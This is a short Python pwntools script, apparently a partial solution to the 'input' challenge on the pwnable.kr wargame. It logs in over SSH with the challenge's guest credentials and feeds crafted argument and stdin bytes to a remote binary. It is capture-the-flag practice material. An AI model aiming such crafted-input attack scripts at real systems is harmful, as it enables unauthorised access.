#!/usr/bin/python

from pwn import *

# prepare payload
cmd = []
cmd.append('./input')
for num in range(1, 100):
    if num == 65:
        cmd.append('\x00')
    elif num == 66:
        cmd.append('\x20\x0a\x0d')
    else:
        cmd.append(str(num));
print '\ncmd: ', cmd

# open connection
s = ssh(host='pwnable.kr',
    user='input2',
    port=2222,
    password='guest')
sh = s.process(argv=cmd, stdin=sys.stdin, stderr=sys.stdin)

# stage 1
print sh.recvline()
print sh.recvline()
print sh.recvline()
print sh.recvline()

# stage 2
sh.sendline('\x00\x0a\x00\xff\x00\x0a\x02\xff')
print sh.recvline()